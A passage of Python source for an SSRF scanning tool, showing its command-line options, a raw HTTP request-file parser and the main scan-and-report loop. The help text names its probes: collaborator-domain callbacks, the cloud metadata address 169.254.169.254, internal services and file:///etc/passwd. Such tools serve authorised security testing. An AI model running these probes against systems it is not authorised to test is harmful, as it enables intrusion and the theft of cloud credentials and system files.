                   help="extra header 'Name: value' (repeatable); overrides "
                        "the same header name coming from -r")
    p.add_argument("-p", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("-b", "--oob-domain", metavar="DOMAIN",
                   help="domain name to use for out-of-band (OOB) interaction "
                        "testing -- a unique subdomain per probe is sent as "
                        "the payload; confirmed automatically if your "
                        "collaborator echoes the label back reversed, or "
                        "via --dns-log, otherwise check your DNS/HTTP "
                        "collaborator logs for hits by hand (e.g. Burp "
                        "Collaborator, interact.sh, or a domain you "
                        "control). This is the default and only test "
                        "performed unless --in-band is also given")
    p.add_argument("--in-band", action="store_true", dest="in_band",
                   help="also send cloud-metadata / internal-service / "
                        "file:// probes (169.254.169.254, Docker/Elastic/"
                        "Consul/..., file:///etc/passwd); off by default "
                        "since it drives the target into reaching real "
                        "infrastructure rather than just a domain you control")
    p.add_argument("--dns-log", metavar="FILE", dest="dns_log",
                   help="path to your DNS server's log file; checked as a "
                        "plain substring match for each pending OOB token "
                        "(incrementally during the run when --confirm-x is "
                        "set, and once at the end), confirming blind SSRF "
                        "via DNS resolution alone even when nothing is "
                        "reflected back in the HTTP response (requires "
                        "-b/--oob-domain)")
    p.add_argument("--confirm-x", type=int, default=3, metavar="N",
                   dest="confirm_x",
                   help="stop testing a URL once N findings are confirmed "
                        "(default 3). No effect without --dns-log")
    return p


def load_urls(path):
    out = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for ln in fh:
            ln = ln.strip()
            if ln and not ln.startswith("#"):
                out.append(ln)
    return out


def make_url_spec(u: str) -> ReqSpec:
    if "://" not in u:
        u = "https://" + u
    return ReqSpec(method="GET", url=u, headers={}, body=None)


def _header_get(headers: dict, name: str):
    """Case-insensitive header lookup -- raw request headers keep their
    original casing, which HTTP itself doesn't care about but a plain
    dict lookup would."""
    name_low = name.lower()
    for k, v in headers.items():
        if k.lower() == name_low:
            return v
    return None


def load_raw_request(path: str, force_ssl: bool = False):
    """
    Parse a raw HTTP request file (Burp Suite's "Copy to file" / "Save
    item", or hand-written) into (method, url, headers, body).

    The request line carries no scheme -- TLS happens one layer below it,
    so it cannot be recovered from the raw bytes alone. The scheme is
    inferred instead: an Origin or Referer header's own scheme is used if
    either is present, otherwise http. --force-ssl overrides this to https
    unconditionally, for a request with neither header that still needs it.
    """
    with open(path, encoding="utf-8", errors="replace") as fh:
        raw = fh.read()
    lines = raw.split("\n")

    if not lines or not lines[0].strip():
        raise ValueError("empty request file")

    req_line = lines[0].rstrip("\r").strip()
    parts = req_line.split(" ")
    if len(parts) < 2:
        raise ValueError(f"malformed request line: {req_line!r}")
    method, path_qs = parts[0].upper(), parts[1]
    if not re.match(r"^[A-Z]+$", method) or not (
            path_qs.startswith("/") or path_qs.startswith("*")
            or "://" in path_qs):
        raise ValueError(f"malformed request line: {req_line!r} -- "
                         f"expected 'METHOD /path HTTP/1.1'")

    headers = {}
    i = 1
    while i < len(lines) and lines[i].rstrip("\r") != "":
        ln = lines[i].rstrip("\r")
        if ":" in ln:
            k, _, v = ln.partition(":")
            headers[k.strip()] = v.strip()
        i += 1

    body = "\n".join(lines[i + 1:]).rstrip("\n") if i + 1 < len(lines) else ""
    body = body if body else None

    host = _header_get(headers, "Host")
    if not host:
        raise ValueError("no Host header -- cannot build a target URL "
                         "from this request")

    if force_ssl:
        scheme = "https"
    else:
        scheme = "http"
        for hname in ("Origin", "Referer"):
            v = _header_get(headers, hname)
            if v:
                s = urlsplit(v).scheme.lower()
                if s in ("http", "https"):
                    scheme = s
                    break

    p = urlsplit(path_qs)
    url = urlunsplit((scheme, host, p.path, p.query, ""))

    fwd_headers = {k: v for k, v in headers.items()
                  if k.lower() not in ("content-length", "transfer-encoding")}
    return method, url, fwd_headers, body


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)

    if args.no_color or os.environ.get("NO_COLOR"):
        set_color(False)

    targets: list[ReqSpec] = []
    if args.url:
        targets.append(make_url_spec(args.url))
    if args.list:
        if not os.path.isfile(args.list):
            print(f"error: no such file: {args.list}", file=sys.stderr)
            return 2
        targets.extend(make_url_spec(u) for u in load_urls(args.list))
    if args.request_file:
        if not os.path.isfile(args.request_file):
            print(f"error: no such file: {args.request_file}", file=sys.stderr)
            return 2
        try:
            method, url, headers, body = load_raw_request(
                args.request_file, force_ssl=args.force_ssl)
        except (OSError, ValueError) as e:
            print(f"error: {args.request_file}: {e}", file=sys.stderr)
            return 2
        targets.append(ReqSpec(method, url, headers, body))

    seen_t, uniq = set(), []
    for t in targets:
        key = (t.method, t.url, t.body)
        if key in seen_t:
            continue
        seen_t.add(key)
        uniq.append(t)
    targets = uniq
    if not targets:
        print("error: no targets (use -u, -l, or -r)", file=sys.stderr)
        return 2

    # By default only OOB runs, and OOB needs a domain to label probes with.
    # Neither flag set means zero requests would ever be sent -- fail loudly
    # instead of running to completion and reporting "no findings" for free.
    if not args.oob_domain and not args.in_band:
        print("error: nothing to test -- pass -b/--oob-domain (out-of-band "
              "probes, the default check) and/or --in-band (cloud-metadata "
              "/ internal-service / file:// probes)", file=sys.stderr)
        return 2
    if args.dns_log and not args.oob_domain:
        print("warning: --dns-log has no effect without -b/--oob-domain "
              "(no OOB tokens are ever sent to look for)", file=sys.stderr)
    if args.confirm_x != 3 and not args.dns_log:
        print("warning: --confirm-x has no effect without --dns-log "
              "(nothing gets confirmed to count against the limit)",
              file=sys.stderr)

    con = Console(args.verbosity)
    status = Status(con, len(targets), interval=args.status_interval,
                    enabled=bool(args.list))

    print(paint(BANNER, "head"))
    print(f"  targets {paint(str(len(targets)), 'b')}   threads {args.threads}   "
          f"timeout {DEFAULT_TIMEOUT:.0f}s")
    modes = []
    modes.append(paint(f"oob ({args.oob_domain})", "ok") if args.oob_domain
                 else paint("oob disabled (no -b/--oob-domain)", "dim"))
    modes.append(paint("in-band: cloud-metadata + internal-services + "
                       "file-scheme", "ok") if args.in_band
                 else paint("in-band disabled (no --in-band)", "dim"))
    if args.dns_log:
        modes.append(paint(f"dns-log ({args.dns_log})", "ok"))
    print(f"  payloads   {'      '.join(modes)}"
          + (f"      status every {args.status_interval:.0f}s"
             if status.enabled else ""))
    print()

    http = Http(con, timeout=DEFAULT_TIMEOUT, delay=0.0, proxy=args.proxy,
                extra_headers=args.header)
    hunter = SsrfHunter(http, con, args, status)

    started = time.time()
    status.start()

    def one(t):
        try:
            hunter.run_target(t)
        except Exception as e:
            con.error(f"{t.url}: {type(e).__name__}: {e}")
        finally:
            status.host_done()

    try:
        if args.threads > 1 and len(targets) > 1:
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=args.threads) as pool:
                list(pool.map(one, targets))
        else:
            for t in targets:
                one(t)
    except KeyboardInterrupt:
        con.error("interrupted by user")
    finally:
        status.stop()
        status.emit(label="final")

    if args.dns_log:
        hunter.check_dns_log(args.dns_log)

    elapsed = time.time() - started
    real = [f for f in hunter.findings if f.sev != INFO]
    print(f"\n  {paint(str(len(real)), 'b')} finding(s) from {http.count} "
          f"requests in {elapsed:.0f}s")
    for sev in (CRIT, HIGH, MED, LOW):
        n = sum(1 for f in hunter.findings if f.sev == sev)
        if n:
            print(f"    {paint(sev, sev):<20} {n}")
    if hunter.deduped:
        print(f"  {paint('deduplicated', 'ok')}: {hunter.deduped} injection "
              f"point(s) on already-tested route templates not retested")
    if args.oob_domain and hunter.oob_sent:
        echo_n = sum(1 for o in hunter.oob_sent if o["confirmed_via"] == "echo")
        dns_n = sum(1 for o in hunter.oob_sent if o["confirmed_via"] == "dns-log")
        pending = [o for o in hunter.oob_sent if not o["confirmed"]]
        if echo_n:
            print(f"  {paint('OOB echo-confirmed', 'ok')}: {echo_n} "
                  f"(already reported above as finding(s))")
        if dns_n:
            print(f"  {paint('OOB DNS-confirmed', 'ok')}: {dns_n} "
                  f"(already reported above as finding(s))")
        if pending:
            tail = ("" if args.dns_log else " -- provide --dns-log to check "
                    "these against your DNS server's log automatically")
            print(f"  {paint('OOB probes pending', 'warn')}: {len(pending)} "
                  f"— not confirmed{tail}; correlate against your "
                  f"{args.oob_domain} DNS/HTTP collaborator logs by hand:")
            for o in pending[:25]:
                print(f"    - {o['token']}.{args.oob_domain}  "
                      f"[{o['param']} on {o['url']}]")
            if len(pending) > 25:
                print(f"    ... and {len(pending) - 25} more")
    if hunter.skipped:
        print(f"  {paint('skipped', 'warn')}: {len(hunter.skipped)}")
        for s in hunter.skipped[:10]:
            print(f"    - {s['url']}  [{s['reason']}]")
    return 0 if not real else 1


if __name__ == "__main__":
    sys.exit(main())
